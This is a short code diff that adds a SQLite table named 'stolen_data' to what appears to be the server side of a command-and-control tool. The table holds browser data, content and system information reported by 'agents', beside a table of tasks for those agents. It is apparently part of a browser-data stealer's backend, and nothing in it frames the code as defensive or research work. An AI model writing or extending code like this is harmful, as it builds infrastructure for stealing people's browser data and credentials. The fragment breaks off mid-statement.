@@ -38,6 +38,18 @@ class Config:
     ''')
         
         c.execute('''
+            CREATE TABLE IF NOT EXISTS stolen_data (
+                id INTEGER PRIMARY KEY,
+                agent_id TEXT,
+                browser TEXT,
+                data_type TEXT,
+                content BLOB,
+                system_info TEXT,
+                timestamp TEXT
+            )
+        ''')
+        
+        c.execute('''
             CREATE TABLE IF NOT EXISTS tasks (
                 id INTEGER PRIMARY KEY,
                 agent_id TEXT,
